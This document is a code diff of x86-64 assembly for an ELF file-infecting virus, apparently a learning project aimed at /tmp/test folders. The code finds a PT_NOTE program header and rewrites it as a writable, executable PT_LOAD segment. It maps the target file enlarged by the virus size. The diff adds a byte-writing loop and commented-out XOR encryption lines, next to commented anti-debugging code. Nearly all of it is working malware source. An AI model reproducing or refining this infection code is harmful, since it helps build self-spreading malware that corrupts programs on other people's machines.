@@ -84,13 +84,14 @@ _start:
 	sub rsp, 5000												; reserving 5000 bytes
 	mov r15, rsp
 	mov byte [r15 + 550], 0										; 0 for /tmp/test, 1 for /tmp/test2
-	mov qword [r15 + 551], 0										; addr for mmmap
 	; mov rax, SYS_PTRACE											; anti-debugging
 	; xor rdi, rdi
 	; syscall
 	; cmp rax, 0
 	; jl cleanup
-
+	.decrypt:
+	nop
+_begin:
 	call set_folder_chdir
 	chdir:
 		pop rdi
@@ -168,7 +169,6 @@ _start:
 			mov rax, SYS_PREAD64
 			syscall
 
-
 			cmp byte [r15 + 208], PT_NOTE					; check if phdr.type in [r15 + 208] is PT_NOTE (4)
 			jz .infect										; if yes, bingo, start infecting
 
@@ -221,7 +221,7 @@ _start:
 				xor rdi, rdi								; addr	-> rdi = NULL
 				mov rsi, _end - _start						; len	-> rsi = virus size
 				add rsi, r10								; target file + virus size
-				mov r11, rsi								; backup final filesize	
+				mov r11, r10								; backup final filesize	
 				mov rdx, PROT_READ | PROT_WRITE				; prot	-> rdx = PROT_READ | PROT_WRITE
 				xor r9, r9								    ; offset = 0
 				mov r10, MAP_SHARED							; flags	-> r10 = MAP_SHARED
@@ -234,16 +234,29 @@ _start:
 				
 				mov r10, rax								; r10 = mmap address
 				; mmunmap(addr, len);
-				
-				.loop:
+				; move st_size to r13
+				mov r13 , [r15 + 48]
 
+				mov rcx, r11
+				add rcx, _start - _end
+				.write_loop:
+					; mov rax, SYS_GETUID
+					; syscall
+					; xor byte [r10 + rcx], 'X'
+					; xor byte [r10 + rcx], 'X'
+					; xor byte [r10 + rcx], 42
+					; xor byte [r13 + rcx], 42					; encrypting
+					; xor byte [r13 + rcx], 42					; decrypting
+					inc rcx
+					cmp rcx, r11					; check if we looped through all bytes already
+					jbe .write_loop
+				xor rcx, rcx
 				mov rdi, r10
 				mov rsi, r11
 				mov rax, SYS_MUNMAP
 				syscall
 				cmp rax, 0									; check if mmunmap failed
 				jne .close_file
-
 			.patch_phdr:
 				mov dword [r15 + 208], PT_LOAD				; patch phdr.type to PT_LOAD (1)
 				mov dword [r15 + 212], PF_R | PF_X | PF_W	; change phdr.flags in [r15 + 212] to PF_X (1) | PF_R (4) | PF_W (2)
